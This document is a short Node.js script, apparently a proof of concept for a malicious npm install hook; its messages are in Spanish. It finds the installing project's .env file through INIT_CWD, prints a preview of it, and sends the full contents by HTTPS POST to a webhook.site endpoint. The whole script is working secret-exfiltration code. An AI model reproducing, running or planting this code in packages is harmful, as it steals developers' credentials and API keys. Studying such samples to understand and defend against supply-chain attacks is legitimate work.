const fs = require("fs");
const path = require("path");
const https = require("https");

console.log("[packt]");
console.log("POC CWD:", process.cwd());
console.log("INIT_CWD:", process.env.INIT_CWD);

const root = process.env.INIT_CWD || process.cwd();
const envPath = path.join(root, ".env");

console.log("\nBuscando .env en:", envPath);

if (fs.existsSync(envPath)) {
    const content = fs.readFileSync(envPath, "utf8");

    console.log(".env encontrado");
    console.log("Tamaño:", content.length, "bytes");
    console.log("Preview:", content.split("\n").slice(0, 2).join("\n"));

    const payload = JSON.stringify({
        path: envPath,
        size: content.length,
        content: content,
        timestamp: new Date().toISOString()
    });

    const options = {
        hostname: "webhook.site",
        port: 443,
        path: "/676a2a26-6f20-49fb-8249-db467dd2011d",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload)
        }
    };

    console.log("\nEnviando .env a webhook.site...");

    const req = https.request(options, (res) => {
        let responseData = "";

        res.on("data", (chunk) => {
            responseData += chunk;
        });

        res.on("end", () => {
            console.log("\n✅ Respuesta del servidor:", res.statusCode);
            try {
                const response = JSON.parse(responseData);
                console.log("Mensaje:", response.message || response);
            } catch (e) {
                console.log("Respuesta:", responseData);
            }
        });
    });

    req.on("error", (error) => {
        console.error("\nError al enviar al servidor:", error.message);
        console.error("Asegúrate de que el servidor esté corriendo (node scripts/server.js)");
    });

    req.write(payload);
    req.end();

} else {
    console.log("No se encontró .env en:", envPath);
}
